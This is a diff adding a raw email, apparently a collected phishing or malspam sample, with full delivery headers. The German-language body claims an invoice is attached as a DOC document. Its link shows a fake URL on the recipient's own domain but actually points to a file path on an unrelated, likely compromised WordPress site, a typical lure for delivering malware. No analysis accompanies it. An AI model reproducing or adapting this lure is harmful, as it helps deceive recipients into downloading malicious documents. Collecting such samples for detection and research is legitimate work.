@@ -1,0 +1,60 @@
+ARC-Authentication-Results: i=1; [removed];
+       spf=pass ([removed]: domain of management@shesport.co.za designates 154.66.66.112 as permitted sender) smtp.mailfrom=management@shesport.co.za;
+       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=shesport.co.za
+Return-Path: <management@shesport.co.za>
+Received: from mail-filter-02.dotnetwork.co.za (mail-filter-02.dotnetwork.co.za. [154.66.66.112])
+        by [removed] for [removed];
+        Mon, 10 Aug 2020 00:51:08 -0700 (PDT)
+Received-SPF: pass ([removed]: domain of management@shesport.co.za designates 154.66.66.112 as permitted sender) client-ip=154.66.66.112;
+Authentication-Results: [removed];
+       spf=pass ([removed]: domain of management@shesport.co.za designates 154.66.66.112 as permitted sender) smtp.mailfrom=management@shesport.co.za;
+       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=shesport.co.za
+Received: from gmtxs23.dotnetwork2.co.za ([154.66.66.81] helo=smtp2.dotnetwork2.co.za)
+	by mail-filter-02.dotnetwork.co.za with esmtps (TLSv1.2:ECDHE-RSA-AES256-SHA384:256)
+	(Exim 4.92)
+	(envelope-from <management@shesport.co.za>)
+	id 1k52a7-00076D-1d
+	for [removed]; Mon, 10 Aug 2020 09:51:06 +0200
+Received: from [115.78.0.147] (115.78.0.147) by hub13 (10.2.203.164) with
+ Microsoft SMTP Server (TLS) id 14.3.487.0; Mon, 10 Aug 2020 09:50:39 +0200
+Date: Mon, 10 Aug 2020 14:50:41 +0700
+From: [name removed] <management@shesport.co.za>
+To: [removed]
+Subject: Re: Re: [info removed]
+MIME-Version: 1.0
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+Message-ID: <00ae4f53-3b8a-4603-ac2b-4e5b57c5fc5a@HUB13.GMS.local>
+X-Originating-IP: [115.78.0.147]
+X-EXCLAIMER-MD-CONFIG: 4ff128d7-9096-41f8-878c-9b55c0a544fe
+X-Originating-IP: 154.66.66.81
+X-SpamExperts-Domain: out.dotnetwork2.co.za
+X-SpamExperts-Username: 154.66.66.0/24
+Authentication-Results: dotnetwork.co.za; auth=pass smtp.auth=154.66.66.0/24@out.dotnetwork2.co.za
+
+<html>
+<body>
+Guten Tag, [info removed]<br><br>
+=0DIn der Anlage erhalten Sie Ihre dazugeh=C3=B6rige Rechnung als DOC-Dokum=
+ent.
+<br>
+<br>
+<a href=3D"https://ufs.pivotroots.com/wp-content/uploads/Scan/nauuimii/iex0=
+9w165388519089dde467yrowd8qtep00c/">http://[recipient's domain]/Inf/ueip9p3=
+q-22103231-2999129-2sw0-fpb07ntk3d</a>
+<br>
+
+<br>
+<br>
+<br>
+
+=0D[info removed]
+<br>
+<br>
+<br>
+<br>
+<pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+[email chain removed]
+</pre>=20
+</body>
+</html>
